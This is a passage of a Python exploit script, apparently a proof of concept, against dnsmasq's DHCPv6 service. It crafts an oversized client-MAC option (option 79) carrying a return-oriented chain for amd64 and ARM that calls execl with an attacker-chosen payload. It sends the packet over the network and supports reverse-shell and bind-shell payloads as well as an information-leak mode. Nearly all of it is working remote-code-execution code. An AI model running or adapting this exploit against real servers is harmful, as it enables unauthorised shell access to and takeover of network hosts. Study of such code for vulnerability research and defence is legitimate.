        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
        option_79 += add_string_in_data(payload_addr, payload)

        # ECX = address("payload")
        option_79 += register_management(architecture, dnsmasq_version, "ecx", payload_addr)

        # ESI = address("interpreter")
        option_79 += register_management(architecture, dnsmasq_version, "rsi", interpreter_addr)

        # EDI = address("interpreter")
        option_79 += register_management(architecture, dnsmasq_version, "rdi", interpreter_addr)

        # RAX = 0x0000000000000000
        option_79 += register_management(architecture, dnsmasq_version, "rax", 0x0000000000000000)

        # EDX = address("interpreter argument")
        option_79 += register_management(architecture, dnsmasq_version, "rdx", interpreter_arg_addr)

        # option_79 += Base.pack64(CRASH[architecture])  # crash for debug

        # R8D = 0x0
        # ECX = address("bash_command")
        # EDX = address("-c")
        # ESI = address("/bin/bash")
        # EDI = address("/bin/bash")
        # EAX = 0x0
        # call EXECL
        option_79 += Base.pack64(EXECL[architecture][dnsmasq_version])  # address of execl

    elif architecture == "arm":

        interpreter_addr = DATA[architecture][dnsmasq_version]
        interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4

        # print "Interpreter address: " + str(hex(interpreter_addr))
        # print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
        # print "Payload address: " + str(hex(payload_addr))

        option_79 += Base.pack16(0)  # mac_type

        option_79 += "A" * JUNK[architecture][dnsmasq_version]

        option_79 += Base.pack32(0x00000000)  # R4 = 0x00000000
        option_79 += Base.pack32(0x00000000)  # R5 = 0x00000000
        option_79 += Base.pack32(0x00000000)  # R6 = 0x00000000
        option_79 += Base.pack32(0x00000000)  # R7 = 0x00000000
        option_79 += Base.pack32(0x00000000)  # R8 = 0x00000000
        option_79 += Base.pack32(0x00000000)  # R9 = 0x00000000
        option_79 += Base.pack32(0x00000000)  # R10 = 0x00000000

        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
        option_79 += add_string_in_data(interpreter_addr, interpreter)
        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
        option_79 += add_string_in_data(payload_addr, payload)

        option_79 += register_management(architecture, dnsmasq_version, "r2", interpreter_arg_addr,
                                         payload_addr + len(payload) + (4 - (len(payload) % 4)) + 4)

        option_79 += register_management(architecture, dnsmasq_version, "r0", interpreter_addr,
                                         payload_addr + len(payload) + (4 - (len(payload) % 4)) + 4)

        option_79 += register_management(architecture, dnsmasq_version, "r1", interpreter_addr)
        option_79 += register_management(architecture, dnsmasq_version, "r3", payload_addr)
        option_79 += register_management(architecture, dnsmasq_version, "r6", 0x00000000)

        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
        option_79 += Base.pack32(EXECL[architecture][dnsmasq_version])  # address of execl
        option_79 += Base.pack32(0x00000000)

    else:
        print Base.c_error + "This architecture: " + architecture + " not yet supported!"
        exit(1)

    pkg = b"".join([
        Base.pack8(12),       # DHCP6RELAYFORW
        Base.pack16(0x0313),  #
        Base.pack8(0x37),     # transaction ID
        b"_" * (34 - 4),      #
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, option_79),
    ])

    eth.src = macsrc
    eth.dst = dhcpv6_server_mac

    ipv6.src = ipv6src
    ipv6.dst = host

    udp.sport = 546
    udp.dport = 547

    pkt = eth / ipv6 / udp / pkg

    try:
        sendp(pkt, iface=current_network_interface, verbose=False)
        print Base.c_success + "Send exploit request to: [" + host + "]:" + str(udp.dport)
    except:
        print Base.c_error + "Do not send exploit request."
        exit(1)


if __name__ == '__main__':
    print Base.c_info + "Network interface name:      " + current_network_interface
    print Base.c_info + "Network interface MAC:       " + macsrc
    print Base.c_info + "Network interface IPv6 glob: " + ipv6src
    print Base.c_info + "Network interface IPv6 link: " + ipv6src_link

    if args.exploit:
        print Base.c_info + "Architecture:    " + architecture
        print Base.c_info + "Dnsmasq version: " + dnsmasq_version
        print Base.c_info + "Interpreter:     " + interpreter
        print Base.c_info + "Interpreter arg: " + interpreter_arg

        if args.payload.startswith("reverse"):
            print Base.c_info + "Payload reverse host: " + reverse_host
            print Base.c_info + "Payload reverse port: " + reverse_port
        if args.payload.startswith("bind"):
            print Base.c_info + "Payload bind port: " + bind_port

        print Base.c_info + "Payload: " + payload

        if args.architecture == "i386" or args.architecture == "amd64":
            print Base.c_info + "Address segment .text:  " + str(hex(TEXT[architecture][dnsmasq_version]))
            print Base.c_info + "Address segment .data:  " + str(hex(DATA[architecture][dnsmasq_version]))
            print Base.c_info + "Address execl function: " + str(hex(EXECL[architecture][dnsmasq_version]))

        exploit()

    if args.info_leak:
        if get_dhcpv6_server_duid():
            info_leak()
